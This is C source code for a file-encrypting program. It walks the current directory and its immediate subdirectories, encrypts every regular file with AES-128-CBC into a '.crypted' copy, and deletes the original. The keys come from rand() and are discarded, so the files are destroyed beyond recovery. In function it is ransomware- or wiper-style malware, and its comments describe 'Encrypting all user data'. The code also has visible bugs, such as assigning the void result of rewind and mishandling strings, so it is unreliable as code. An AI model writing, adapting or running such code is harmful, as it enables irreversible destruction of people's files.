#include <stdio.h>
#include <dirent.h>
#include <string.h>
#include <stdlib.h>
#include <openssl/evp.h>
#include <openssl/aes.h>
#include <openssl/err.h>

#define BUFSIZE 1024
#define KEY_LENGTH 16 //128 bits
#define IV_LENGTH 16  //128 bits

int encrypt(const unsigned char *plaintext, int plaintext_len, const unsigned char *key,
            const unsigned char *iv, unsigned char *ciphertext);
int decrypt(const unsigned char *ciphertext, int ciphertext_len, const unsigned char *key,
            const unsigned char *iv, unsigned char *plaintext);
int aes_cbc_encrypt_file(FILE *fp_in, FILE *fp_out, const unsigned char *key, const unsigned char *iv);

int main(int argc, char *argv[])
{
    char *str;
    DIR *d;
    struct dirent *dir;
    DIR *subd;
    struct dirent *subdir;
    d = opendir("."); //current working directory
    if (d)
    {
        while ((dir = readdir(d)) != NULL)
        {
            //Ignoring "." and ".."
            if ((strcmp(dir->d_name, ".")) && (strcmp(dir->d_name, "..")))
            {

                int path_length = (int)strlen(dir->d_name);

                //Checking whether directory is a file
                if (dir->d_type == DT_REG)
                {
                    char *pathname = (char *)malloc(sizeof(char) * (path_length + 2));
                    strcpy(pathname, dir->d_name);

                    //Opening the current file
                    FILE *fp_in = fopen(pathname, "rb");

                    //Generating the ciphertext output file name
                    int dot_position = 0;
                    for (int i = 0; i < path_length; i++)
                    {
                        if (pathname[i] == '.')
                            dot_position = i;
                    }
                    char *file = (char *)malloc(sizeof(char) * (dot_position + 1));
                    strncpy(file, pathname, dot_position);
                    strcat(file, ".crypted");
                    char *filepath = malloc((int)strlen(dir->d_name) + 13);
                    strcpy(filepath, dir->d_name);
                    strcat(filepath, ".crypted");
                    FILE *fp_out = fopen(filepath, "wb");

                    //Generating key and iv
                    unsigned char *key = (unsigned char *)malloc(sizeof(unsigned char) * KEY_LENGTH);
                    for (int z = 0; z < KEY_LENGTH; z++)
                    {
                        key[z] = rand() % 256;
                    }
                    unsigned char *iv = (unsigned char *)malloc(sizeof(unsigned char) * IV_LENGTH);
                    for (int z = 0; z < IV_LENGTH; z++)
                    {
                        iv[z] = rand() % 256;
                    }

                    //Encrypting all user data
                    aes_cbc_encrypt_file(fp_in, fp_out, key, iv);
                    fclose(fp_in);
                    fclose(fp_out);
                    remove(pathname);
                }
                //Recursively iterating through subdirectories
                else if (dir->d_type == DT_DIR)
                {
                    char *subdirectory = (char *)malloc(sizeof(char) * ((int)strlen(dir->d_name) + 2));
                    sprintf(subdirectory, "%s/", dir->d_name);
                    subd = opendir(subdirectory);
                    if (subd)
                    {
                        while ((subdir = readdir(subd)) != NULL)
                        {
                            if ((strcmp(subdir->d_name, ".")) && (strcmp(subdir->d_name, "..")))
                            {

                                int path_length = (int)strlen(subdir->d_name);

                                //Checking whether directory is a file
                                if (subdir->d_type == DT_REG)
                                {
                                    char *pathname = (char *)malloc(sizeof(char) * (path_length + 2 + strlen(dir->d_name)));
                                    strcpy(pathname, dir->d_name);
                                    strcat(pathname, "/");
                                    strcat(pathname, subdir->d_name);

                                    //Opening the current file
                                    FILE *fp_in = fopen(pathname, "rb");

                                    //Generating the ciphertext output file name
                                    int dot_position = 0;
                                    for (int i = 0; i < path_length; i++)
                                    {
                                        if (pathname[i] == '.')
                                            dot_position = i;
                                    }
                                    char *file = (char *)malloc(sizeof(char) * (dot_position + 1));
                                    strncpy(file, pathname, dot_position);
                                    strcat(file, ".crypted");
                                    char *filepath = (char *)malloc(sizeof(char) * (strlen(dir->d_name) + strlen(subdir->d_name) + 13));
                                    strcpy(filepath, dir->d_name);
                                    strcat(filepath, "/");
                                    strcat(filepath, subdir->d_name);
                                    strcat(filepath, ".crypted");
                                    FILE *fp_out = fopen(filepath, "wb");

                                    //Generating key and iv
                                    unsigned char *key = (unsigned char *)malloc(sizeof(unsigned char) * KEY_LENGTH);
                                    for (int z = 0; z < KEY_LENGTH; z++)
                                    {
                                        key[z] = rand() % 256;
                                    }
                                    unsigned char *iv = (unsigned char *)malloc(sizeof(unsigned char) * IV_LENGTH);
                                    for (int z = 0; z < IV_LENGTH; z++)
                                    {
                                        iv[z] = rand() % 256;
                                    }

                                    //Encrypting all user data
                                    aes_cbc_encrypt_file(fp_in, fp_out, key, iv);
                                    fclose(fp_in);
                                    fclose(fp_out);
                                    remove(pathname);
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    else
    {
        perror("Could not open directory");
        return EXIT_FAILURE;
    }

    closedir(d);
    return 0;
}

int encrypt(const unsigned char *plaintext, int plaintext_len, const unsigned char *key,
            const unsigned char *iv, unsigned char *ciphertext)
{
    EVP_CIPHER_CTX *ctx;

    int len;
    int ciphertext_len;

    /* Create and initialise the context */
    if (!(ctx = EVP_CIPHER_CTX_new()))
    {
        ERR_print_errors_fp(stderr);
        return 0;
    }

    /* Initialise the encryption operation. IMPORTANT - ensure you use a key
       and IV size appropriate for your cipher
       In this example we are using 128 bit AES (i.e. a 128 bit key). The
       IV size for *most* modes is the same as the block size. For AES this
       is 128 bits */
    if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, key, iv))
    {
        ERR_print_errors_fp(stderr);
        return 0;
    }

    /* Provide the message to be encrypted, and obtain the encrypted output.
       EVP_EncryptUpdate can be called multiple times if necessary
    */
    if (1 != EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len))
    {
        ERR_print_errors_fp(stderr);
        return 0;
    }
    ciphertext_len = len;

    /* Finalise the encryption. Further ciphertext bytes may be written at
       this stage.
    */
    if (1 != EVP_EncryptFinal_ex(ctx, ciphertext + len, &len))
    {
        ERR_print_errors_fp(stderr);
        return 0;
    }
    ciphertext_len += len;

    /* Clean up */
    EVP_CIPHER_CTX_free(ctx);

    return ciphertext_len;
}

int decrypt(const unsigned char *ciphertext, int ciphertext_len, const unsigned char *key,
            const unsigned char *iv, unsigned char *plaintext)
{
    EVP_CIPHER_CTX *ctx;

    int len;
    int plaintext_len;

    /* Create and initialise the context */
    if (!(ctx = EVP_CIPHER_CTX_new()))
    {
        ERR_print_errors_fp(stderr);
        return 0;
    }

    /* Initialise the decryption operation. IMPORTANT - ensure you use a key
       and IV size appropriate for your cipher
       In this example we are using 128 bit AES (i.e. a 128 bit key). The
       IV size for *most* modes is the same as the block size. For AES this
       is 128 bits */
    if (1 != EVP_DecryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, key, iv))
    {
        ERR_print_errors_fp(stderr);
        return 0;
    }

    /* Provide the message to be decrypted, and obtain the plaintext output.
       EVP_DecryptUpdate can be called multiple times if necessary
    */
    if (1 != EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len))
    {
        ERR_print_errors_fp(stderr);
        return 0;
    }
    plaintext_len = len;

    /* Finalise the decryption. Further plaintext bytes may be written at
       this stage.
    */
    if (1 != EVP_DecryptFinal_ex(ctx, plaintext + len, &len))
    {
        ERR_print_errors_fp(stderr);
        return 0;
    }
    plaintext_len += len;

    /* Clean up */
    EVP_CIPHER_CTX_free(ctx);

    return plaintext_len;
}

//CBC encryption using AES
int aes_cbc_encrypt_file(FILE *fp_in, FILE *fp_out, const unsigned char *key, const unsigned char *iv)
{
    int x = fseek(fp_in, 0L, SEEK_END);
    x = ftell(fp_in);
    x = rewind(fp_in);

    unsigned char *inbuf = malloc((unsigned)x);
    size_t count = fread(inbuf, 1, x, fp_in);
    unsigned char *outbuf = malloc((unsigned)x + EVP_MAX_BLOCK_LENGTH);
    int inlen = x;
    int outlen, tmplen;
    EVP_CIPHER_CTX *ctx;
    /* Bogus key and IV: we'd normally set these from
       another source.
    */

    /* Don't set key or IV right away; we want to check lengths */
    ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, NULL, NULL);
    OPENSSL_assert(EVP_CIPHER_CTX_key_length(ctx) == 16);
    OPENSSL_assert(EVP_CIPHER_CTX_iv_length(ctx) == 16);

    /* Now we can set key and IV */
    EVP_EncryptInit_ex(ctx, NULL, NULL, key, iv);

    /* Encrypt first block.
       Computation is independent of array indices so easily
       vectorized by the compiler
    */
    if (!EVP_EncryptUpdate(ctx, outbuf, &outlen, inbuf, inlen))
        return -1;

    /* Encrypt remaining blocks one at a time */
    for (;;)
    {
        /* In case the last call to EVP_EncryptUpdate updated
           tmplen, it may not be the length of the ciphertext!
        */
        if (!EVP_EncryptUpdate(ctx, outbuf + outlen, &tmplen,
                              inbuf + outlen, inlen - outlen))
            return -1;
        outlen += tmplen;

        if (tmplen < 1024)
            break;
    }

    if (!EVP_EncryptFinal_ex(ctx, outbuf + outlen, &tmplen))
        return -1;
    outlen += tmplen;

    /* Output encrypted data */
    fwrite(outbuf, 1, outlen, fp_out);

    EVP_CIPHER_CTX_free(ctx);
    free(inbuf);
    free(outbuf);

    return 0;
}
